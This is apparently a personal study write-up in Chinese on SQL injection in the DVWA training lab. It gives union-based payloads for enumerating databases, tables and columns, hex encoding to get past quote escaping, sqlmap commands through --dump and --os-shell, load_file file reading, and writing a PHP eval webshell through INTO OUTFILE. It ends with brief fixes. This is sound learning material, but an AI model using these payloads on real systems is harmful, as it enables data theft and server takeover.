Dvwa_SQL injection(Not Blind)

很早之前就学过了SQL注入了，应该是一个月前吧，现在再用的时候又忘记了（哭笑）。。。但通过再一次的学习，又对SQL注入有了更深的了解。。。这里就以Dvwa_SQL injection举例，每个等级就列出一点注意事项即可。。。

（HIGH）Dvwa_SQL injection手动

第一步：判断注入点类型（判断是否可以注入被跳过。。。。）

有三种注入方式需要判断：

  1. 1 or 1=1 （#） 因为这种类型查询的时候，用的是id=x（x为输入变量）,不需要进行单引号闭合。。所以其实#（忽略符）也可以不用加。。。随便一提：该语句可以适用于medium等级
  2. 1’ or ‘1’=’1 或1’ or 1=1 # 因为这种类型查询的时候，用的是id=’x’，需要闭合单引号或者直接把单引号注释掉。。。顺便一提：该语句适用于low等级
  3. 1” or “1”=”1 或 1” or 1=1 # 因为这种类型查询的时候，用的是id=”x”，需要闭合双引号或者直接把双引号注释掉。。。Dvwa中没有此类型应用，记一下。。

通过对high等级的分析，使用第二种方法即可判断。。。。。随便一提，该处的medium等级对’（单引号）和”（双引号）都进行了转义，这对之后的数据库定位和数据表定位造成麻烦，可以使用Hex编码或16进制等方式进行绕过。。。High等级与low等级在手动的方法上基本差不多，问题出现在用SQLMAP的时候会有差异，之后再说。。。

在这步骤需要获得查询字段数：使用order by或直接select 1,2,3,····等方式获得。。。该处获得查询字段数为2。。。

第二步：获得数据库

该方式没什么好说的，我当前只学过一个语句获得数据库名：
1’ union select 1,database()’ 即可获得数据库名：dvwa

第三步：获得数据表

该方式有两种：
1.通过exist函数并且通过字典爆破的方式来获得数据表，由于我没有字典，这里不使用这种方式。优势不用依赖管理员权限以及当没有information_schema文件时可以使用。。局限就是可能爆破不出来。。。。
这里附上之前使用的代码例子：
id = 2 and exist(select * from member) (#)若有正常查询则说明存在member表
id = 2 and exist(select pw from member) (#)若有正常查询则说明存在member表的pw列
由于这里是第一种注入方式，所以可以不进行闭合。。。（just example from pikachu）
2.通过查询information_schema的方式进行查询，该方法非常有效，此处使用该方法进行查询。局限性在于：可能没有管理员权限或者SQL中没有information_schema表。。。
这里附查询代码:(该处table_schema可以看做数据库的意思)
id=1’ union select 1,table_name from information_schema.tables where table_schema = ‘dvwa’ #

第四步：获得列

有以上的基础，即可简单获得列名。。。若只能输出一行，则使用group_concat(column_name)查询。。。
附代码：
1’ union select 1,column_name from information_schema.columns where table_schema = ‘dvwa’ and table_name = ‘users’ #

最后：查数据

查数据就不用多提了，直接查询即可。。。。。。
顺便一提：因为medium等级把单引号和双引号都进行了转义，所以以上查表以及列的方法无效，此时就需要进行编码来绕过。。把dvwa进行Hex编码即可（可能前面未加0x，没有时要手动加上。。。)PS：那个是零。。。
举个例子吧：table_schema = ‘dvwa’ 改成 table_schema = 0x64767761 即可不带单引号或双引号。。。
不知道为什么，medium等级hackerbar无法正常使用，使用Burpsuite抓包后才能正常。。

（low）Dvwa_SQL injection自动（SQLMAP）

因为high等级的注入其实与low等级注入大同小异，high等级注入列出注意点即可。
这个就直接附代码和说明一下即可，就不长篇大论了。。。说明一下新学到的点吧。。
–data “附上全部POST参数”
-p可以指定测试参数（get、post）
-C指定列”column1,column2”可选择性列出

  1. 测试注入点 sqlmap.py -u “URL” --data “post参数” -p “指定的post参数” --cookie “cookie”
  2. 获取数据库 sqlmap.py -u “URL” --data “post参数” -p “指定的post参数” --cookie “cookie” --current-db
  3. 获取数据表 sqlmap.py -u “URL” --data “post参数” -p “指定的post参数” --cookie “cookie” -D “dbname” --tables
  4. 获取列 sqlmap.py -u “URL” --data “post参数” -p “指定的post参数” --cookie “cookie” -D “dbname” -T “tbname” --columns
  5. 获取数据 sqlmap.py -u “URL” --data “post参数” -p “指定的post参数” --cookie “cookie” -D “dbname” -T “tbname” -C”C1,C2” --dump

high等级时的差异：high等级注入与回显页面不是同一个页面，此时需要添加–second-order（注意：在我使用的SQLMAP中改成了–second-url）来选择回显页面。。其它与low等级一样(真的一模一样）

另外学到的东西

文件读取

使用load_file(“”)可以读取电脑中的文件（也需要select……）

写入一句话木马

要先获得物理路径之后，再写入木马。。。步骤如下

  1. id = xx’ union select “xx”,”xx” into outfile + ‘xx’ # (不知道为什么在我的环境下不行。。。。）
  2. id = 1’ union select “<?php @eval($_GET[“cmd”]);?>” into outfile +”D:\phpStudy\…….\cmd.php –+ （需要获得物理路径才能操作。。。）
    使用SQLmap也可插入Webshell，要使用到–os-shell （仍需物理路径。。。。）
    物理路径如何取得，以后有机会再回来更新吧。。。。（因为现在还不会。。。）

修复方法

1.白名单
2.参数化SQL语句 (最好）（最多使用的就是预编译）
3.黑名单 （尽量不使用）
